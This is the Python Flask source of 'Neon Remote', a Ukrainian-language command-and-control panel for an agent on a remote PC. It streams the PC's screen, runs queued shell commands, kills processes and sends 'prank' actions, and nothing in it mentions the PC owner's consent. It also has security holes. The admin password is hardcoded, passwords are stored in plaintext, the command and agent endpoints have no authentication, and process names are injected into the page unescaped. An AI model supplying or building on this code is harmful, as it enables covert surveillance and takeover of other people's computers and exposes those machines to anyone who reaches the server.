import os
import json
import time
import base64
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify, Response

app = Flask(__name__)
app.secret_key = "neon_super_secret_key_change_me"

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "Zlata"
USERS_FILE = "users.json"

# --- MongoDB підготовка ---
# import pymongo
# client = pymongo.MongoClient("mongodb://localhost:27017/")
# db = client["neon_remote"]
# users_col = db["users"]

def load_users():
    if not os.path.exists(USERS_FILE):
        users = {
            ADMIN_USERNAME: {
                "password": ADMIN_PASSWORD,
                "permissions": ["admin", "screen", "files", "commands", "processes", "camera", "network", "remote"],
            }
        }
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(users, f, indent=2)
        return users
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

# --- Стан Агента в пам'яті сервера ---
AGENT_STATE = {
    "last_seen": 0,
    "cpu": 0,
    "ram": 0,
    "volume": 50,
    "screenshot": None, # bytes
    "cmd_output": "Очікування команд...",
    "processes": []
}

COMMAND_QUEUE = []

# --- HTML ШАБЛОНИ ---
LOGIN_TEMPLATE = r"""
<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<title>Вхід — Neon Remote</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
:root { --neon: #00ffd0; --bg: #05060d; --surface: rgba(10, 15, 30, 0.7); --border: rgba(0, 255, 208, 0.2); }
body { background: var(--bg); color: var(--neon); font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
.login-box { background: var(--surface); padding: 40px; border-radius: 20px; border: 1px solid var(--border); box-shadow: 0 0 30px rgba(0, 255, 208, 0.1); backdrop-filter: blur(10px); width: 100%; max-width: 380px; text-align: center; }
.title { font-size: 24px; font-weight: 800; margin-bottom: 30px; letter-spacing: 1px; }
.input-group { margin-bottom: 20px; text-align: left; }
.input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 8px; text-transform: uppercase; }
input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.5); color: #fff; font-size: 16px; outline: none; box-sizing: border-box; }
input:focus { border-color: var(--neon); box-shadow: 0 0 15px rgba(0, 255, 208, 0.2); }
button { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-top: 10px; }
button:hover { background: var(--neon); color: var(--bg); box-shadow: 0 0 20px var(--neon); }
.msg { color: #ff4d4d; margin-bottom: 20px; font-size: 14px; }
</style>
</head>
<body>
<div class="login-box">
  <div class="title">NEON SYSTEM</div>
  {% if msg %}<div class="msg">{{ msg }}</div>{% endif %}
  <form method="POST">
    <div class="input-group">
      <label>Username</label>
      <input name="username" type="text" placeholder="admin" required autocomplete="off">
    </div>
    <div class="input-group">
      <label>Password</label>
      <input name="password" type="password" placeholder="••••••••" required>
    </div>
    <button type="submit">Увійти в систему</button>
  </form>
</div>
</body>
</html>
"""

MAIN_TEMPLATE = r"""
<!doctype html>
<html lang="uk">
<head>
<meta charset="utf-8">
<title>Neon Remote — Dashboard</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
* { box-sizing: border-box; }
body { margin: 0; background: var(--bg); color: var(--neon); font-family: 'Inter', sans-serif; overflow: hidden; }
.layout { display: grid; grid-template-columns: 1fr 340px; height: 100vh; padding: 20px; gap: 20px; }
.main-col { display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
.right-col { display: flex; flex-direction: column; gap: 20px; }
.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(10px); }
.card b { display: block; margin-bottom: 15px; font-size: 16px; text-transform: uppercase; color: #fff; }
.btn { border: 1px solid var(--neon); background: rgba(0,0,0,0.3); color: var(--neon); padding: 10px 16px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: 600; text-decoration: none; display: inline-block; }
.btn:hover { background: var(--neon); color: var(--bg); box-shadow: 0 0 15px var(--neon); }
textarea { width: 100%; height: 80px; background: rgba(0,0,0,0.5); color: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 12px; outline: none; font-family: monospace; }
pre { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 10px; overflow-x: auto; color: #aaa; font-family: monospace; border: 1px solid var(--border); max-height: 200px; }
img.screen { width: 100%; border-radius: 10px; border: 1px solid var(--border); display: block; min-height: 200px; background: #000; }
.stat-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-weight: 600; color: #fff; }
.bar { height: 8px; background: rgba(0,0,0,0.5); border-radius: 4px; overflow: hidden; margin-bottom: 10px; }
.bar div { height: 100%; width: 0%; background: var(--neon); transition: width 0.3s ease; box-shadow: 0 0 10px var(--neon); }
.status-online { color: #00ff66; font-weight: bold; }
.status-offline { color: #ff4d4d; font-weight: bold; }
</style>
</head>
<body>
<div class="layout">
  <div class="main-col">
    <div class="card">
      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
        <b style="margin:0;">Екран ПК Агента</b>
        <span id="agentStatus" class="status-offline">ОФЛАЙН</span>
      </div>
      <img id="screenImg" src="/api/screen.jpg" class="screen">
    </div>

    <div class="card">
      <b>Консоль Команд (CMD / PowerShell)</b>
      <form id="cmdForm">
        <textarea id="cmdInput" placeholder="Введіть команду (наприклад: dir або whoami)..."></textarea>
        <div style="display:flex; gap:10px; margin-top:10px;">
          <button type="submit" class="btn">Виконати на ПК</button>
          <a href="/processes" class="btn" style="border-color:#aaa; color:#ccc;">Менеджер процесів</a>
          <a href="/logout" class="btn" style="border-color:#ff4d4d; color:#ff4d4d; margin-left:auto;">Вийти</a>
        </div>
      </form>
      <pre id="cmdOutput">Результат з'явиться після виконання...</pre>
    </div>
  </div>

  <div class="right-col">
    <div class="card">
      <div class="stat-header">CPU ПК <span id="cpuVal">0%</span></div>
      <div class="bar"><div id="cpuBar"></div></div>
    </div>

    <div class="card">
      <div class="stat-header">RAM ПК <span id="ramVal">0%</span></div>
      <div class="bar"><div id="ramBar"></div></div>
    </div>

    <div class="card">
      <b>Гучність ПК</b>
      <div style="display:flex; align-items:center; gap:15px;">
        <input type="range" min="0" max="100" value="50" id="volumeSlider" style="flex:1; cursor:pointer;">
        <span id="volumeVal" style="font-weight:600;">50%</span>
      </div>
    </div>

    <div class="card">
      <b>Швидкі Пранки</b>
      <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
        <button class="btn" style="font-size:12px;" onclick="sendTroll('beep')">🔊 Beep</button>
        <button class="btn" style="font-size:12px;" onclick="sendTroll('msg')">💬 Повідомлення</button>
      </div>
    </div>
  </div>
</div>

<script>
async function updateStats(){
  try {
    const r = await fetch('/api/system');
    const d = await r.json();
    document.getElementById('cpuBar').style.width = d.cpu + "%";
    document.getElementById('ramBar').style.width = d.ram + "%";
    document.getElementById('cpuVal').innerText = d.cpu + "%";
    document.getElementById('ramVal').innerText = d.ram + "%";
    
    const statusEl = document.getElementById('agentStatus');
    if (d.online) {
      statusEl.innerText = "ОНЛАЙН";
      statusEl.className = "status-online";
    } else {
      statusEl.innerText = "ОФЛАЙН";
      statusEl.className = "status-offline";
    }
    
    if (d.cmd_output) {
      document.getElementById('cmdOutput').innerText = d.cmd_output;
    }
  } catch(e){}
}

setInterval(updateStats, 1500);
setInterval(() => {
  document.getElementById('screenImg').src = "/api/screen.jpg?t=" + new Date().getTime();
}, 2000);

document.getElementById('cmdForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const cmd = document.getElementById('cmdInput').value;
  if(!cmd) return;
  await fetch('/api/run_cmd', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({cmd})
  });
  document.getElementById('cmdInput').value = '';
  document.getElementById('cmdOutput').innerText = 'Команду відправлено на ПК... Очікування результату...';
});

const volSlider = document.getElementById('volumeSlider');
volSlider.addEventListener('change', () => {
  document.getElementById('volumeVal').innerText = volSlider.value + '%';
  fetch('/api/volume', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({value: volSlider.value})
  });
});

function sendTroll(action) {
  fetch('/api/troll', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({action})
  });
}
</script>
</body>
</html>
"""

PROCESSES_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="utf-8">
<title>Процеси ПК — Neon Remote</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--neon); padding: 30px; }
.btn { border: 1px solid var(--neon); background: transparent; color: var(--neon); padding: 8px 16px; border-radius: 10px; cursor: pointer; text-decoration: none; display: inline-block; }
.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(10px); }
table { width: 100%; border-collapse: collapse; text-align: left; margin-top: 15px; }
th, td { padding: 12px; border-bottom: 1px solid var(--border); color: #ccc; }
th { color: var(--neon); text-transform: uppercase; }
.action-btn { background: transparent; border: 1px solid #ff4d4d; color: #ff4d4d; padding: 6px 10px; border-radius: 6px; cursor: pointer; }
</style>
</head>
<body>
<a href="/" class="btn" style="margin-bottom: 20px;">⬅ На головну</a>
<div class="card">
  <h2>Менеджер процесів ПК</h2>
  <table>
    <thead><tr><th>PID</th><th>Назва</th><th>Дії</th></tr></thead>
    <tbody id="plist"><tr><td colspan="3">Завантаження...</td></tr></tbody>
  </table>
</div>
<script>
async function loadProc(){
  const r = await fetch('/api/processes');
  const data = await r.json();
  const tbody = document.getElementById('plist');
  if(!data.length) { tbody.innerHTML = '<tr><td colspan="3">Немає даних від Агента</td></tr>'; return; }
  tbody.innerHTML = data.map(p => `
    <tr>
      <td>${p.pid}</td>
      <td style="color:#fff;">${p.name}</td>
      <td><button class="action-btn" onclick="killProc(${p.pid})">❌ Завершити</button></td>
    </tr>
  `).join('');
}
function killProc(pid){
  fetch('/api/process/kill', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({pid})
  }).then(() => setTimeout(loadProc, 1000));
}
loadProc();
</script>
</body>
</html>
"""

# --- WEB ROUTES ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        users = load_users()
        u = request.form.get('username')
        p = request.form.get('password')
        if u in users and users[u]['password'] == p:
            session['user'] = u
            return redirect('/')
        return render_template_string(LOGIN_TEMPLATE, msg="Невірний логін або пароль")
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect('/login')

@app.route('/')
def main():
    if 'user' not in session:
        return redirect('/login')
    return render_template_string(MAIN_TEMPLATE)

@app.route('/processes')
def processes_page():
    if 'user' not in session:
        return redirect('/login')
    return render_template_string(PROCESSES_TEMPLATE)

# --- CLIENT API ENDPOINTS ---
@app.route('/api/system')
def api_system():
    online = (time.time() - AGENT_STATE['last_seen']) < 5
    return jsonify({
        'cpu': AGENT_STATE['cpu'],
        'ram': AGENT_STATE['ram'],
        'online': online,
        'cmd_output': AGENT_STATE['cmd_output']
    })

@app.route('/api/screen.jpg')
def api_screen():
    if AGENT_STATE['screenshot']:
        return Response(AGENT_STATE['screenshot'], mimetype='image/jpeg')
    # Бланк прозорого/чорного кадру
    return Response(b'', mimetype='image/jpeg')

@app.route('/api/run_cmd', methods=['POST'])
def api_run_cmd():
    cmd = request.json.get('cmd')
    if cmd:
        COMMAND_QUEUE.append({'type': 'cmd', 'payload': cmd})
    return jsonify({'status': 'queued'})

@app.route('/api/volume', methods=['POST'])
def api_volume():
    val = request.json.get('value')
    COMMAND_QUEUE.append({'type': 'volume', 'payload': val})
    return jsonify({'status': 'queued'})

@app.route('/api/troll', methods=['POST'])
def api_troll():
    action = request.json.get('action')
    COMMAND_QUEUE.append({'type': 'troll', 'payload': action})
    return jsonify({'status': 'queued'})

@app.route('/api/processes')
def api_processes():
    return jsonify(AGENT_STATE['processes'])

@app.route('/api/process/kill', methods=['POST'])
def api_kill_process():
    pid = request.json.get('pid')
    COMMAND_QUEUE.append({'type': 'kill_proc', 'payload': pid})
    return jsonify({'status': 'queued'})

# --- AGENT API (Зв'язок із ПК) ---
@app.route('/api/agent/report', methods=['POST'])
def agent_report():
    data = request.json or {}
    AGENT_STATE['last_seen'] = time.time()
    AGENT_STATE['cpu'] = data.get('cpu', 0)
    AGENT_STATE['ram'] = data.get('ram', 0)
    AGENT_STATE['processes'] = data.get('processes', [])
    
    img_b64 = data.get('screenshot')
    if img_b64:
        AGENT_STATE['screenshot'] = base64.b64decode(img_b64)
        
    cmd_out = data.get('cmd_output')
    if cmd_out:
        AGENT_STATE['cmd_output'] = cmd_out
        
    # Віддаємо чергу команд для ПК
    global COMMAND_QUEUE
    pending_cmds = list(COMMAND_QUEUE)
    COMMAND_QUEUE = []
    return jsonify({'commands': pending_cmds})

if __name__ == '__main__':
    print("🚀 Сервер запущено на http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
